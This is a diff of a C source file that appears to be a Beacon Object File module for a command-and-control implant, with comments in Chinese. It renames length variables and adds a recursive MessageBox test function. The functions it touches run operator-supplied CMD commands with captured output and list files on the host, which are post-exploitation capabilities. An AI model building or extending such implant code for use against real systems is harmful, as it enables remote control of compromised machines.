@@ -1,10 +1,10 @@
 ﻿#include "FuncDecl.h"
 
 // 执行 CMD 命令
-void ExecuteCmd$$(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
+void ExecuteCmd$$(char* commandPara, int commandParaLen, char** pOutputData, int* pOutputDataLen, PVOID specialParaList[]) {
     *pOutputData = (char*)MSVCRT$malloc(130);
     MSVCRT$sprintf_s(*pOutputData, 130, "%s", "[-] CMD Failed.");
-    *pOutputDataLength = 15;
+    *pOutputDataLen = 15;
 
     HANDLE hRead, hWrite;
     SECURITY_ATTRIBUTES sa;
@@ -32,22 +32,32 @@ void ExecuteCmd$$(char* commandPara, int commandParaLength, char** pOutputData, 
     Kernel32$CloseHandle(pi.hProcess);
 
     MSVCRT$sprintf_s(*pOutputData, 130, "%s", "[+] Run Successful.\n");
-    *pOutputDataLength = 20;
-    DWORD currentReadLength;
+    *pOutputDataLen = 20;
+    DWORD currentReadLen;
     do {
-        Kernel32$ReadFile(hRead, *pOutputData + *pOutputDataLength, 100, &currentReadLength, NULL);
-        *pOutputDataLength += currentReadLength;
-        *pOutputData = (char*)MSVCRT$realloc(*pOutputData, *pOutputDataLength + 100);
-    } while (currentReadLength != 0);
+        Kernel32$ReadFile(hRead, *pOutputData + *pOutputDataLen, 100, &currentReadLen, NULL);
+        *pOutputDataLen += currentReadLen;
+        *pOutputData = (char*)MSVCRT$realloc(*pOutputData, *pOutputDataLen + 100);
+    } while (currentReadLen != 0);
 
     Kernel32$CloseHandle(hRead);
 }
 
+// 测试 BOF 内部函数调用
+void TestCall$$(int count) {
+    if (count) {
+        User32$MessageBoxA(0, "Content", "Title", MB_ICONWARNING);
+        TestCall$$(--count);
+    }
+}
+
 // 获取文件信息列表
-void GetFileInfoList$$(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
+void GetFileInfoList$$(char* commandPara, int commandParaLen, char** pOutputData, int* pOutputDataLen, PVOID specialParaList[]) {
     *pOutputData = (char*)MSVCRT$malloc(330);
     MSVCRT$sprintf_s(*pOutputData, 330, "%s", "[-] GetFileInfoList Failed.");
-    *pOutputDataLength = 27;
+    *pOutputDataLen = 27;
+
+    TestCall$$(2);
 
     WIN32_FIND_DATAA findData;
     HANDLE hFind = Kernel32$FindFirstFileA(commandPara, &findData);
@@ -74,5 +84,5 @@ void GetFileInfoList$$(char* commandPara, int commandParaLength, char** pOutputD
             }
         } while (Kernel32$FindNextFileA(hFind, &findData));
     }
-    *pOutputDataLength = MSVCRT$strlen(*pOutputData);
+    *pOutputDataLen = MSVCRT$strlen(*pOutputData);
 }
